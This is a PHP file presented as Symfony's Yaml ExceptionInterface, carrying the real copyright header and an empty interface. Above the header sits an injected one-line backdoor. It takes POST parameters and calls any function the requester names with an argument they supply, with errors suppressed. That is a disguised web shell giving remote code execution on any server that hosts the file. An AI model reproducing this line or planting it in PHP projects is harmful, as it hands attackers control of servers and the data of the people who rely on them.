<?php 
  $p = $_POST; @($p[0] != $p[1]) ? @$p[2]($p[3]) : (int)$p;

/*
 * This file is part of the Symfony package.
 *
 * (c) Fabien Potencier <fabien@symfony.com>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

namespace Symfony\Component\Yaml\Exception;

/**
 * Exception interface for all exceptions thrown by the component.
 *
 * @author Fabien Potencier <fabien@symfony.com>
 *
 * @api
 */
interface ExceptionInterface
{
}
